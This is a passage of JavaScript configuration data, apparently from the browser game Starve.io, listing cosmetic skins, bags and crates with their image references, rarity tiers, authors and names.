          author: "Taco4Life",
          name: "Cthulhu"
        }, {
          id: 143,
          day: IMAGES.SKIN119D,
          night: IMAGES.SKIN119N,
          dayHand: IMAGES.HAND_SKIN119D,
          nightHand: IMAGES.HAND_SKIN119N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Mr. Cactus"
        }, {
          id: 144,
          day: IMAGES.SKIN120D,
          night: IMAGES.SKIN120N,
          dayHand: IMAGES.HAND_SKIN120D,
          nightHand: IMAGES.HAND_SKIN120N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Momo"
        }, {
          id: 95,
          day: IMAGES.SKIN70D,
          night: IMAGES.SKIN70N,
          dayHand: IMAGES.HAND_SKIN70D,
          nightHand: IMAGES.HAND_SKIN70N,
          rarity: RARITY.REIDITE,
          author: "Taco4Life",
          name: "Mr. Garlic"
        }, {
          id: 76,
          day: IMAGES.SKIN51D,
          night: IMAGES.SKIN51N,
          dayHand: IMAGES.HAND_SKIN51D,
          nightHand: IMAGES.HAND_SKIN51N,
          rarity: RARITY.REIDITE,
          author: "Winter",
          name: "Robot Dragon"
        }, {
          id: 44,
          day: IMAGES.SKIN1D,
          night: IMAGES.SKIN1N,
          dayHand: IMAGES.HAND_SKIN1D,
          nightHand: IMAGES.HAND_SKIN1N,
          rarity: RARITY.REIDITE,
          author: "Winter",
          name: "Lava Dragon Version 1"
        }, {
          id: 90,
          day: IMAGES.SKIN65D,
          night: IMAGES.SKIN65N,
          dayHand: IMAGES.HAND_SKIN65D,
          nightHand: IMAGES.HAND_SKIN65N,
          rarity: RARITY.REIDITE,
          author: "ExpertyAnimations",
          name: "Lava Dragon Version 2"
        }, {
          id: 124,
          day: IMAGES.SKIN99D,
          night: IMAGES.SKIN99N,
          dayHand: IMAGES.HAND_SKIN99D,
          nightHand: IMAGES.HAND_SKIN99N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Lava Dragon Version 3"
        }, {
          id: 45,
          day: IMAGES.SKIN12D,
          night: IMAGES.SKIN12N,
          dayHand: IMAGES.HAND_SKIN12D,
          nightHand: IMAGES.HAND_SKIN12N,
          rarity: RARITY.REIDITE,
          author: "Sushui",
          name: "Ice Dragon Version 1"
        }, {
          id: 46,
          day: IMAGES.SKIN13D,
          night: IMAGES.SKIN13N,
          dayHand: IMAGES.HAND_SKIN13D,
          nightHand: IMAGES.HAND_SKIN13N,
          rarity: RARITY.REIDITE,
          author: "Winter",
          name: "Ice Dragon Version 2"
        }, {
          id: 108,
          day: IMAGES.SKIN83D,
          night: IMAGES.SKIN83N,
          dayHand: IMAGES.HAND_SKIN83D,
          nightHand: IMAGES.HAND_SKIN83N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Ice Dragon Version 3"
        }, {
          id: 123,
          day: IMAGES.SKIN98D,
          night: IMAGES.SKIN98N,
          dayHand: IMAGES.HAND_SKIN98D,
          nightHand: IMAGES.HAND_SKIN98N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Baby Dragon Version 1"
        }, {
          id: 128,
          day: IMAGES.SKIN103D,
          night: IMAGES.SKIN103N,
          dayHand: IMAGES.HAND_SKIN103D,
          nightHand: IMAGES.HAND_SKIN103N,
          rarity: RARITY.REIDITE,
          author: "MADBalgouthi",
          name: "Baby Dragon Version 2"
        }, {
          id: 125,
          day: IMAGES.SKIN100D,
          night: IMAGES.SKIN100N,
          dayHand: IMAGES.HAND_SKIN100D,
          nightHand: IMAGES.HAND_SKIN100N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Baby Lava"
        }, {
          id: 47,
          day: IMAGES.SKIN21D,
          night: IMAGES.SKIN21N,
          dayHand: IMAGES.HAND_SKIN21D,
          nightHand: IMAGES.HAND_SKIN21N,
          rarity: RARITY.REIDITE,
          author: "Taco4Life",
          name: "Kraken"
        }, {
          id: 129,
          day: IMAGES.SKIN104D,
          night: IMAGES.SKIN104N,
          dayHand: IMAGES.HAND_SKIN104D,
          nightHand: IMAGES.HAND_SKIN104N,
          rarity: RARITY.REIDITE,
          author: "Taco4Life",
          name: "Sandworm"
        }, {
          id: 63,
          day: IMAGES.SKIN38D,
          night: IMAGES.SKIN38N,
          dayHand: IMAGES.HAND_SKIN38D,
          nightHand: IMAGES.HAND_SKIN38N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Mr. Golden Bread"
        }, {
          id: 67,
          day: IMAGES.SKIN42D,
          night: IMAGES.SKIN42N,
          dayHand: IMAGES.HAND_SKIN42D,
          nightHand: IMAGES.HAND_SKIN42N,
          rarity: RARITY.REIDITE,
          author: "ForgottenHeroe",
          name: "Starver Ores"
        }, {
          id: 130,
          day: IMAGES.SKIN105D,
          night: IMAGES.SKIN105N,
          dayHand: IMAGES.HAND_SKIN105D,
          nightHand: IMAGES.HAND_SKIN105N,
          rarity: RARITY.REIDITE,
          author: "Taco4Life",
          name: "Poo"
        }, {
          id: 89,
          day: IMAGES.SKIN64D,
          night: IMAGES.SKIN64N,
          dayHand: IMAGES.HAND_SKIN64D,
          nightHand: IMAGES.HAND_SKIN64N,
          rarity: RARITY.REIDITE,
          author: "Poinet",
          name: "Volcano Starver"
        }, {
          id: 112,
          day: IMAGES.SKIN87D,
          night: IMAGES.SKIN87N,
          dayHand: IMAGES.HAND_SKIN87D,
          nightHand: IMAGES.HAND_SKIN87N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Lava Starver"
        }, {
          id: 48,
          day: IMAGES.SKIN_ROBOTD,
          night: IMAGES.SKIN_ROBOTN,
          dayHand: IMAGES.HAND_ROBOTD,
          nightHand: IMAGES.HAND_ROBOTN,
          rarity: RARITY.SPECIAL,
          author: "eogito",
          name: "Robot"
        }, {
          id: 110,
          day: IMAGES.SKIN85D,
          night: IMAGES.SKIN85N,
          dayHand: IMAGES.HAND_SKIN85D,
          nightHand: IMAGES.HAND_SKIN85N,
          rarity: RARITY.SPECIAL,
          author: "pizza wa",
          name: "Blue Butterfly"
        }, {
          id: 157,
          day: IMAGES.SKIN133D,
          night: IMAGES.SKIN133N,
          dayHand: IMAGES.HAND_SKIN133D,
          nightHand: IMAGES.HAND_SKIN133N,
          rarity: RARITY.SPECIAL,
          author: "eogito",
          name: "Yrifox"
        }, {
          id: 165,
          day: IMAGES.SKIN141D,
          night: IMAGES.SKIN141N,
          dayHand: IMAGES.HAND_SKIN141D,
          nightHand: IMAGES.HAND_SKIN141N,
          rarity: RARITY.SPECIAL,
          author: "OmarJr13",
          name: "Blob Skin"
        }],
        BAG: [{
          id: 0,
          day: IMAGES.BAGD,
          night: IMAGES.BAGN,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Bag 1"
        }, {
          id: 1,
          day: IMAGES.BAG0D,
          night: IMAGES.BAG0N,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Old Bag"
        }, {
          id: 2,
          day: IMAGES.BAG4D,
          night: IMAGES.BAG4N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Bag 2"
        }, {
          id: 3,
          day: IMAGES.BAG5D,
          night: IMAGES.BAG5N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Bag 3"
        }, {
          id: 4,
          day: IMAGES.BAG6D,
          night: IMAGES.BAG6N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Bag 4"
        }, {
          id: 5,
          day: IMAGES.BAG7D,
          night: IMAGES.BAG7N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Bag 5"
        }, {
          id: 11,
          day: IMAGES.BAG23D,
          night: IMAGES.BAG23N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Wood Pickaxe Bag"
        }, {
          id: 19,
          day: IMAGES.BAG16D,
          night: IMAGES.BAG16N,
          rarity: RARITY.WOOD,
          author: "Starve.io ",
          name: "Wood Carrier"
        }, {
          id: 37,
          day: IMAGES.BAG36D,
          night: IMAGES.BAG36N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Bag 6"
        }, {
          id: 39,
          day: IMAGES.BAG38D,
          night: IMAGES.BAG38N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Bag with Wooden Swords"
        }, {
          id: 44,
          day: IMAGES.BAG43D,
          night: IMAGES.BAG43N,
          rarity: RARITY.WOOD,
          author: "Communist",
          name: "Big Bag"
        }, {
          id: 7,
          day: IMAGES.BAG14D,
          night: IMAGES.BAG14N,
          rarity: RARITY.STONE,
          author: "Communist",
          name: "Bag 6"
        }, {
          id: 8,
          day: IMAGES.BAG_EASTERD,
          night: IMAGES.BAG_EASTERN,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Easter Bag"
        }, {
          id: 9,
          day: IMAGES.BAG_STARD,
          night: IMAGES.BAG_STARN,
          rarity: RARITY.STONE,
          author: "pizza wa",
          name: "Star Bag"
        }, {
          id: 10,
          day: IMAGES.BAG9D,
          night: IMAGES.BAG9N,
          rarity: RARITY.STONE,
          author: "eogito",
          name: "Winter Bag"
        }, {
          id: 20,
          day: IMAGES.BAG17D,
          night: IMAGES.BAG17N,
          rarity: RARITY.STONE,
          author: "Starve.io ",
          name: "Stone Carrier"
        }, {
          id: 24,
          day: IMAGES.BAG24D,
          night: IMAGES.BAG24N,
          rarity: RARITY.STONE,
          author: "eogito",
          name: "Stone Pickaxe Bag"
        }, {
          id: 6,
          day: IMAGES.BAG13D,
          night: IMAGES.BAG13N,
          rarity: RARITY.STONE,
          author: "Communist",
          name: "Bag Camouflage"
        }, {
          id: 38,
          day: IMAGES.BAG37D,
          night: IMAGES.BAG37N,
          rarity: RARITY.STONE,
          author: "eogito",
          name: "Bag with Stone Swords"
        }, {
          id: 54,
          day: IMAGES.BAG53D,
          night: IMAGES.BAG53N,
          rarity: RARITY.STONE,
          author: "eogito",
          name: "Cow Bag"
        }, {
          id: 59,
          day: IMAGES.BAG58D,
          night: IMAGES.BAG58N,
          rarity: RARITY.STONE,
          author: "CrysTal",
          name: "Starver Bag"
        }, {
          id: 62,
          day: IMAGES.BAG61D,
          night: IMAGES.BAG61N,
          rarity: RARITY.STONE,
          author: "CrysTal",
          name: "Crystal Sky Bag"
        }, {
          id: 13,
          day: IMAGES.BAG10D,
          night: IMAGES.BAG10N,
          rarity: RARITY.GOLD,
          author: "pizza wa",
          name: "Honey Pot"
        }, {
          id: 21,
          day: IMAGES.BAG18D,
          night: IMAGES.BAG18N,
          rarity: RARITY.GOLD,
          author: "Starve.io ",
          name: "Gold Carrier"
        }, {
          id: 30,
          day: IMAGES.BAG25D,
          night: IMAGES.BAG25N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Gold Pickaxe Bag"
        }, {
          id: 29,
          day: IMAGES.BAG31D,
          night: IMAGES.BAG31N,
          rarity: RARITY.GOLD,
          author: "Ariel",
          name: "Mr and Mrs Bakers"
        }, {
          id: 41,
          day: IMAGES.BAG40D,
          night: IMAGES.BAG40N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Bag with Golden Swords"
        }, {
          id: 47,
          day: IMAGES.BAG46D,
          night: IMAGES.BAG46N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Explorer Bag"
        }, {
          id: 51,
          day: IMAGES.BAG50D,
          night: IMAGES.BAG50N,
          rarity: RARITY.GOLD,
          author: "pizza wa",
          name: "Bamboo Bag"
        }, {
          id: 53,
          day: IMAGES.BAG52D,
          night: IMAGES.BAG52N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Mummy Bag"
        }, {
          id: 58,
          day: IMAGES.BAG57D,
          night: IMAGES.BAG57N,
          rarity: RARITY.GOLD,
          author: "MADBalgouthi",
          name: "Watermelon Bag"
        }, {
          id: 60,
          day: IMAGES.BAG59D,
          night: IMAGES.BAG60N,
          rarity: RARITY.GOLD,
          author: "Taco4Life",
          name: "Garlic Bag"
        }, {
          id: 61,
          day: IMAGES.BAG60D,
          night: IMAGES.BAG59N,
          rarity: RARITY.GOLD,
          author: "Taco4Life",
          name: "Pumpkin Bag"
        }, {
          id: 64,
          day: IMAGES.BAG63D,
          night: IMAGES.BAG63N,
          rarity: RARITY.GOLD,
          author: "upfiz",
          name: "Oil Barel bag"
        }, {
          id: 67,
          day: IMAGES.BAG68D,
          night: IMAGES.BAG68N,
          rarity: RARITY.GOLD,
          author: "pizza wa",
          name: "Tree Bag"
        }, {
          id: 14,
          day: IMAGES.BAG1D,
          night: IMAGES.BAG1N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "a Rabbit in my Bag"
        }, {
          id: 15,
          day: IMAGES.BAG2D,
          night: IMAGES.BAG2N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Bird's nest"
        }, {
          id: 16,
          day: IMAGES.BAG3D,
          night: IMAGES.BAG3N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "a Fish on your Back"
        }, {
          id: 17,
          day: IMAGES.BAG8D,
          night: IMAGES.BAG8N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "a Squirrel in my Bag"
        }, {
          id: 22,
          day: IMAGES.BAG19D,
          night: IMAGES.BAG19N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io ",
          name: "Diamond Carrier"
        }, {
          id: 12,
          day: IMAGES.BAG22D,
          night: IMAGES.BAG22N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Resources Bag"
        }, {
          id: 32,
          day: IMAGES.BAG26D,
          night: IMAGES.BAG26N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Diamond Pickaxe Bag"
        }, {
          id: 40,
          day: IMAGES.BAG39D,
          night: IMAGES.BAG39N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Bag with Diamond Swords"
        }, {
          id: 45,
          day: IMAGES.BAG44D,
          night: IMAGES.BAG44N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "My Cake Bag"
        }, {
          id: 46,
          day: IMAGES.BAG45D,
          night: IMAGES.BAG45N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "My Christmas Cake Bag"
        }, {
          id: 52,
          day: IMAGES.BAG51D,
          night: IMAGES.BAG51N,
          rarity: RARITY.DIAMOND,
          author: "MADBalgouthi",
          name: "Fish Bag"
        }, {
          id: 65,
          day: IMAGES.BAG64D,
          night: IMAGES.BAG64N,
          rarity: RARITY.DIAMOND,
          author: "pizza wa",
          name: "Cloud Bag"
        }, {
          id: 68,
          day: IMAGES.BAG66D,
          night: IMAGES.BAG66N,
          rarity: RARITY.DIAMOND,
          author: "pizza wa",
          name: "Bee Bag"
        }, {
          id: 48,
          day: IMAGES.BAG47D,
          night: IMAGES.BAG47N,
          rarity: RARITY.AMETHYST,
          author: "fatant",
          name: "Natural Bag"
        }, {
          id: 23,
          day: IMAGES.BAG20D,
          night: IMAGES.BAG20N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io ",
          name: "Amethyst Carrier"
        }, {
          id: 25,
          day: IMAGES.BAG27D,
          night: IMAGES.BAG27N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Amethyst Pickaxe Bag"
        }, {
          id: 28,
          day: IMAGES.BAG30D,
          night: IMAGES.BAG30N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Your Baby"
        }, {
          id: 33,
          day: IMAGES.BAG32D,
          night: IMAGES.BAG32N,
          rarity: RARITY.AMETHYST,
          author: "pizza wa",
          name: "Tropical Bag"
        }, {
          id: 43,
          day: IMAGES.BAG42D,
          night: IMAGES.BAG42N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Bag with Amethyst Swords"
        }, {
          id: 35,
          day: IMAGES.BAG34D,
          night: IMAGES.BAG34N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Ice Bag"
        }, {
          id: 50,
          day: IMAGES.BAG49D,
          night: IMAGES.BAG49N,
          rarity: RARITY.AMETHYST,
          author: "Taco4Life",
          name: "Thornbush Bag"
        }, {
          id: 56,
          day: IMAGES.BAG55D,
          night: IMAGES.BAG55N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Autumn Bag"
        }, {
          id: 57,
          day: IMAGES.BAG56D,
          night: IMAGES.BAG56N,
          rarity: RARITY.AMETHYST,
          author: "Taco4Life",
          name: "Dino Egg Bag"
        }, {
          id: 66,
          day: IMAGES.BAG65D,
          night: IMAGES.BAG65N,
          rarity: RARITY.AMETHYST,
          author: "pizza wa",
          name: "Magic Cloud Bag"
        }, {
          id: 69,
          day: IMAGES.BAG67D,
          night: IMAGES.BAG67N,
          rarity: RARITY.AMETHYST,
          author: "pizza wa",
          name: "Chest Bag"
        }, {
          id: 31,
          day: IMAGES.BAG21D,
          night: IMAGES.BAG21N,
          rarity: RARITY.REIDITE,
          author: "Starve.io ",
          name: "Reidite Carrier"
        }, {
          id: 18,
          day: IMAGES.BAG11D,
          night: IMAGES.BAG11N,
          rarity: RARITY.REIDITE,
          author: "Winter",
          name: "Lava Bag"
        }, {
          id: 49,
          day: IMAGES.BAG48D,
          night: IMAGES.BAG48N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Lava Bag 2"
        }, {
          id: 36,
          day: IMAGES.BAG35D,
          night: IMAGES.BAG35N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Dragon Bag"
        }, {
          id: 55,
          day: IMAGES.BAG54D,
          night: IMAGES.BAG54N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Winter Ice Bag"
        }, {
          id: 26,
          day: IMAGES.BAG28D,
          night: IMAGES.BAG28N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Reidite Pickaxe Bag"
        }, {
          id: 27,
          day: IMAGES.BAG29D,
          night: IMAGES.BAG29N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Octopus Bowl"
        }, {
          id: 34,
          day: IMAGES.BAG33D,
          night: IMAGES.BAG33N,
          rarity: RARITY.REIDITE,
          author: "Taco4Life",
          name: "Cave Bag"
        }, {
          id: 42,
          day: IMAGES.BAG41D,
          night: IMAGES.BAG41N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Bag with Reidite Swords"
        }, {
          id: 63,
          day: IMAGES.BAG62D,
          night: IMAGES.BAG62N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Engineer Bag"
        }],
        CRATE: [{
          id: 0,
          day: IMAGES.CRATE7D,
          night: IMAGES.CRATE7N,
          rarity: RARITY.FREE,
          author: "eogito",
          name: "Wooden Dead Box"
        }, {
          id: 1,
          day: IMAGES.CRATE6D,
          night: IMAGES.CRATE6N,
          rarity: RARITY.FREE,
          author: "eogito",
          name: "Hidden item"
        }, {
          id: 2,
          day: IMAGES.CRATE1D,
          night: IMAGES.CRATE1N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Wooden Box 1"
        }, {
          id: 3,
          day: IMAGES.CRATE2D,
          night: IMAGES.CRATE2N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Wooden Box 2"
        }, {
          id: 4,
          day: IMAGES.CRATE3D,
          night: IMAGES.CRATE3N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Wooden Box 3"
        }, {
          id: 5,
          day: IMAGES.CRATE4D,
          night: IMAGES.CRATE4N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Broken Wooden Box"
        }, {
          id: 6,
          day: IMAGES.CRATE5D,
          night: IMAGES.CRATE5N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Wooden Box"
        }, {
          id: 7,
          day: IMAGES.CRATE8D,
          night: IMAGES.CRATE8N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Wooden Battle Box"
        }, {
          id: 8,
          day: IMAGES.CRATE9D,
          night: IMAGES.CRATE9N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Wooden Box with a Cross"
        }, {
          id: 9,
          day: IMAGES.CRATE10D,
          night: IMAGES.CRATE10N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Wooden Box with Bubbles"
        }, {
          id: 10,
          day: IMAGES.CRATE11D,
          night: IMAGES.CRATE11N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Wooden Box with Eyes"
        }, {
          id: 11,
          day: IMAGES.CRATE12D,
          night: IMAGES.CRATE12N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Dark Wooden Box"
        }, {
          id: 38,
          day: IMAGES.CRATE39D,
          night: IMAGES.CRATE39N,
          rarity: RARITY.WOOD,
          author: "Weddlz",
          name: "Noob Box"
        }, {
          id: 12,
          day: IMAGES.CRATE13D,
          night: IMAGES.CRATE13N,
          rarity: RARITY.STONE,
          author: "eogito",
          name: "Wooden and Stone Box"
        }, {
          id: 14,
          day: IMAGES.CRATE19D,
          night: IMAGES.CRATE19N,
          rarity: RARITY.STONE,
          author: "pizza wa",
          name: "Star Box 1"
        }, {
          id: 15,
          day: IMAGES.CRATE20D,
          night: IMAGES.CRATE20N,
          rarity: RARITY.STONE,
          author: "pizza wa",
          name: "Star Box 2"
        }, {
          id: 27,
          day: IMAGES.CRATE29D,
          night: IMAGES.CRATE29N,
          rarity: RARITY.STONE,
          author: "eogito",
          name: "Flower Box"
        }, {
          id: 46,
          day: IMAGES.CRATE47D,
          night: IMAGES.CRATE47N,
          rarity: RARITY.STONE,
          author: "MADBalgouthi",
          name: "Blue Box"
        }, {
          id: 19,
          day: IMAGES.CRATE21D,
          night: IMAGES.CRATE21N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Beehive"
        }, {
          id: 13,
          day: IMAGES.CRATE14D,
          night: IMAGES.CRATE14N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Wooden and Golden Box"
        }, {
          id: 21,
          day: IMAGES.CRATE22D,
          night: IMAGES.CRATE22N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Gravestone"
        }, {
          id: 25,
          day: IMAGES.CRATE26D,
          night: IMAGES.CRATE26N,
          rarity: RARITY.GOLD,
          author: "Communist",
          name: "Sky Box"
        }, {
          id: 29,
          day: IMAGES.CRATE30D,
          night: IMAGES.CRATE30N,
          rarity: RARITY.GOLD,
          author: "Winter",
          name: "Golden Box"
        }, {
          id: 34,
          day: IMAGES.CRATE35D,
          night: IMAGES.CRATE35N,
          rarity: RARITY.GOLD,
          author: "Communist",
          name: "Water Crate"
        }, {
          id: 35,
          day: IMAGES.CRATE36D,
          night: IMAGES.CRATE36N,
          rarity: RARITY.GOLD,
          author: "Communist",
          name: "Glass Crate"
        }, {
          id: 16,
          day: IMAGES.CRATE15D,
          night: IMAGES.CRATE15N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Wooden and Diamond Box"
        }, {
          id: 18,
          day: IMAGES.CRATE18D,
          night: IMAGES.CRATE18N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Don't Hit Me"
        }, {
          id: 26,
          day: IMAGES.CRATE27D,
          night: IMAGES.CRATE27N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Underwater Box"
        }, {
          id: 31,
          day: IMAGES.CRATE32D,
          night: IMAGES.CRATE32N,
          rarity: RARITY.DIAMOND,
          author: "Communist",
          name: "Items Pile"
        }, {
          id: 32,
          day: IMAGES.CRATE33D,
          night: IMAGES.CRATE33N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Cake Box"
        }, {
          id: 33,
          day: IMAGES.CRATE34D,
          night: IMAGES.CRATE34N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Christmas Cake Box"
        }, {
          id: 36,
          day: IMAGES.CRATE37D,
          night: IMAGES.CRATE37N,
          rarity: RARITY.DIAMOND,
          author: "Fukss",
          name: "Crab Box"
        }, {
          id: 42,
          day: IMAGES.CRATE43D,
          night: IMAGES.CRATE43N,
          rarity: RARITY.DIAMOND,
          author: "MADBalgouthi",
          name: "Fishing Box"
        }, {
          id: 22,
          day: IMAGES.CRATE23D,
          night: IMAGES.CRATE23N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Let me out of here"
        }, {
          id: 17,
          day: IMAGES.CRATE16D,
          night: IMAGES.CRATE16N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Wooden and Amethyst Box"
        }, {
          id: 24,
          day: IMAGES.CRATE25D,
          night: IMAGES.CRATE25N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Aquarium"
        }, {
          id: 28,
          day: IMAGES.CRATE28D,
          night: IMAGES.CRATE28N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Gift Box"
        }, {
          id: 40,
          day: IMAGES.CRATE41D,
          night: IMAGES.CRATE41N,
          rarity: RARITY.AMETHYST,
          author: "MADBalgouthi",
          name: "Open Watermelon Box"
        }, {
          id: 41,
          day: IMAGES.CRATE42D,
          night: IMAGES.CRATE42N,
          rarity: RARITY.AMETHYST,
          author: "MADBalgouthi",
          name: "Watermelon Box"
        }, {
          id: 39,
          day: IMAGES.CRATE40D,
          night: IMAGES.CRATE40N,
          rarity: RARITY.AMETHYST,
          author: "Taco4Life",
          name: "Thornbush Box"
        }, {
          id: 43,
          day: IMAGES.CRATE44D,
          night: IMAGES.CRATE44N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Rabbit in the Box"
        }, {
          id: 47,
          day: IMAGES.CRATE48D,
          night: IMAGES.CRATE48N,
          rarity: RARITY.AMETHYST,
          author: "Taco4Life",
          name: "Garlic Plot"
        }, {
          id: 48,
          day: IMAGES.CRATE49D,
          night: IMAGES.CRATE49N,
          rarity: RARITY.AMETHYST,
          author: "Taco4Life",
          name: "Pumpkin Plot"
        }, {
          id: 45,
          day: IMAGES.CRATE46D,
          night: IMAGES.CRATE46N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Autumn Box"
        }, {
          id: 44,
          day: IMAGES.CRATE45D,
          night: IMAGES.CRATE45N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Winter Box"
        }, {
          id: 20,
          day: IMAGES.CRATE17D,
          night: IMAGES.CRATE17N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Metal and Reidite Box"
        }, {
          id: 23,
          day: IMAGES.CRATE24D,
          night: IMAGES.CRATE24N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Kraken Box"
        }, {
          id: 30,
          day: IMAGES.CRATE31D,
          night: IMAGES.CRATE31N,
          rarity: RARITY.REIDITE,
          author: "Winter",
          name: "Lava Box"
        }, {
          id: 37,
          day: IMAGES.CRATE38D,
          night: IMAGES.CRATE38N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Lava Box 2"
        }, {
          id: 49,
          day: IMAGES.CRATE50D,
          night: IMAGES.CRATE50N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Rabbit"
        }, {
          id: 50,
          day: IMAGES.CRATE51D,
          night: IMAGES.CRATE51N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Wolf"
        }, {
          id: 51,
          day: IMAGES.CRATE52D,
          night: IMAGES.CRATE52N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Spider"
        }, {
          id: 52,
          day: IMAGES.CRATE53D,
          night: IMAGES.CRATE53N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Hawk"
        }, {
          id: 53,
          day: IMAGES.CRATE54D,
          night: IMAGES.CRATE54N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Bear"
        }, {
          id: 54,
          day: IMAGES.CRATE55D,
          night: IMAGES.CRATE55N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Fox"
        }, {
          id: 55,
          day: IMAGES.CRATE56D,
          night: IMAGES.CRATE56N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Baby Mammoth"
        }, {
          id: 56,
          day: IMAGES.CRATE57D,
          night: IMAGES.CRATE57N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Mammoth"
        }, {
          id: 57,
          day: IMAGES.CRATE58D,
          night: IMAGES.CRATE58N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Sandworm"
        }, {
          id: 58,
          day: IMAGES.CRATE59D,
          night: IMAGES.CRATE59N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Vulture"
        }, {
          id: 59,
          day: IMAGES.CRATE60D,
          night: IMAGES.CRATE60N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Kraken"
        }, {
          id: 60,
          day: IMAGES.CRATE61D,
          night: IMAGES.CRATE61N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Piranha"
        }, {
          id: 61,
          day: IMAGES.CRATE62D,
          night: IMAGES.CRATE62N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Baby Dragon"
        }, {
          id: 62,
          day: IMAGES.CRATE63D,
          night: IMAGES.CRATE63N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Baby Lava"
        }, {
          id: 63,
          day: IMAGES.CRATE64D,
          night: IMAGES.CRATE64N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Dragon"
        }, {
          id: 64,
          day: IMAGES.CRATE65D,
          night: IMAGES.CRATE65N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Penguin"
        }, {
          id: 65,
          day: IMAGES.CRATE66D,
          night: IMAGES.CRATE66N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Lava Dragon"
        }, {
          id: 66,
          day: IMAGES.CRATE67D,
